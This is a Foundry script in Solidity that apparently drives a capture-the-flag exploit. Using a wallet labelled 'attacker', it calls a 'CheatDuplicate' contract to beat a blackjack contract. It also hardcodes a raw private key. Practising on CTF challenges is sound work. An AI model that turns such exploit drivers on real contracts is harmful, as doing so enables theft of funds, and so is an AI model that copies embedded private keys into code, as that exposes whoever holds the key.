// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/Vm.sol";
import "../test/blackjack.t.sol";

contract Blackjackcript is Script {
    Challenge challenge =
        Challenge(address(0x78A0750a67BD8566172D54912bbE38ed9D9A842A));
    uint deployerPrivateKey =
        0x75532bea2ee501ea86c846c6394524b1fbcadeeb489f4aae5834fdca6a276319;

    address private immutable BLACKJACK =
        0xA65D59708838581520511d98fB8b5d1F76A96cad;

    uint public minBet = 0.05 ether; // 0.05 eth
    uint public maxBet = 5 ether;
    IBlackJack public blackjack;

    function setUp() public {
        blackjack = IBlackJack(BLACKJACK);
    }

    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(
            deployerPrivateKey,
            "attacker"
        );
        address owner = wallet.addr;
        console.log("attacker wallet: ", wallet.addr);
        console.log("balance: %e", address(wallet.addr).balance);

        vm.startBroadcast(deployerPrivateKey);
        ////////////////
        if (!challenge.isSolved()) {
            // CheatDuplicate cheat = new CheatDuplicate(address(BLACKJACK));
            CheatDuplicate cheat = CheatDuplicate(payable(0x06CC565D044d6B26B3CE5ca8e4cef76E3c1CD700));

            console.log("deploy CheatDuplicate: ", address(cheat));
            // payable(cheat).transfer(50 ether);
            cheat.cheat{gas: 10000000}();
            
        }

        console.log("is solved: ", challenge.isSolved());
        ////////////////
        vm.stopBroadcast();
    }
}
